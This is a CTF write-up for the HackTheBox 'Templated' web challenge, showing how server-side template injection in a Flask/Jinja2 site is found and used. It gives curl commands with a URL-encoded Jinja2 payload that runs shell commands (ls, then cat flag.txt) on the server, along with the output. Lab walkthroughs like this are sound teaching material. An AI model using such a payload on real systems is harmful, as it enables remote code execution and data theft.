---
title: Templated
categories: [writeups,HackTheBox]
tags: [web,jinja2]
---

## Description

- Name: **Templated**
- Platform: **HackTheBox**
- Difficulty: **Easy**
- CTF Category: **Web**
- Comments on the box: 
> **SSTI is fun**

## Method to solve

- Look into the website to search for interesting information.

```bash
$ curl http://159.65.30.65:32674/

<h1>Site still under construction</h1>
<p>Proudly powered by Flask/Jinja2</p>
```

- Based on the information, notice that it is powered by **Flask/Jinja2** which are common known to [**SSTI**](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
- Since our first assumption is **SSTI**, lets look for a place which we could input something.

```bash

%7B%7B7%2A7%7D%7D == /{/{7*7/}/} URL encoded 

$ curl http://159.65.30.65:32674/%7B%7B7%2A7%7D%7D

<h1>Error 404</h1>
<p>The page '<str>49</str>' could not be found</p>%
```

- `%7B%7B7%2A7%7D%7D` == `{{7*7}}` URL encoded
- After trying out a few times, we managed to inject our simple SSTI payload into the challenge.
- The URLencoded value `{{7*7}}` has changed to 49 in the output of the challenge.
- The next step would be to get a RCE SSTI payload to perform RCE.

```bash
# `%7B%7B%20config.__class__.from_envvar.__globals__.import_string%28%22os%22%29.popen%28%22ls%22%29.read%28%29%20%7D%7D` == `{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}` URL Encoded  

$ curl http://159.65.30.65:32674/%7B%7B%20config.__class__.from_envvar.__globals__.import_string%28%22os%22%29.popen%28%22ls%22%29.read%28%29%20%7D%7D

<h1>Error 404</h1>
<p>The page '<str>bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
</str>' could not be found</p>%
```

- Based on the SSTI payload, we managed to execute command `ls` and return some information. 
- Based on the information, we noticed that there is a flag there.
- Now just change the SSTI payload above into `cat flag.txt` and urlencode it to get the flag. 

## Things i learned today 
- SSTI Payload 
- URLencode